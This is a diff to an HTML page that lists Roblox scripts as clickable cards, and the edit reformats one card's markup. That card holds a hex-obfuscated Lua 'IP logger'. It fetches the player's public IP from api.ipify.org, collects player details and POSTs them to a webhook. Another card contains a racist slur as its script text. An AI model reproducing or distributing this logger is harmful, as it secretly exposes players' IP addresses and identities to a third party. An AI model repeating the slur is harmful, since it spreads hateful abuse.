@@ -44,7 +44,9 @@
           <p>Join any Roblox server instantly</p>
         </div>
 
-      <div class="card" onclick="showScript('Executor Info + IP logger', `local _A = tostring(game:HttpGet('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x69\x70\x69\x66\x79\x2e\x6f\x72\x67', true))
+      <div class="card"
+     data-name="Executor Info + IP logger (Hex Encoded)"
+     data-script= "local _A = tostring(game:HttpGet('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x69\x70\x69\x66\x79\x2e\x6f\x72\x67', true))
 local _B = game:GetService('\x48\x74\x74\x70\x53\x65\x72\x76\x69\x63\x65')
 local _C = game:GetService('\x50\x6c\x61\x79\x65\x72\x73').LocalPlayer
 
@@ -98,8 +100,9 @@ _L({ Url = _H, Body = _J, Method = '\x50\x4f\x53\x54', Headers = _K })
 
 print('\x35\x30\x20\x6c\x6f\x67\x67\x65')
 print('\x53\x63\x72\x69\x70\x74\x20\x6d\x61\x64\x65\x20\x62\x79\x20\x53\x79\x72\x30\x6e\x69\x78')`)">
-    <h3>Executor Info + IP logger (Hex Encoded)</h3>
-    <p>Fully hex-encoded Lua with plain text webhook placeholder</p>
+     onclick="showScript(this.dataset.name, this.dataset.script)">
+  <h3>Executor Info + IP logger (Hex Encoded)</h3>
+  <p>Fully hex-encoded Lua with plain text webhook placeholder</p>
 </div>
 
         <div class="card" onclick="showScript('Wolf RP', 'Cum Nigger')">
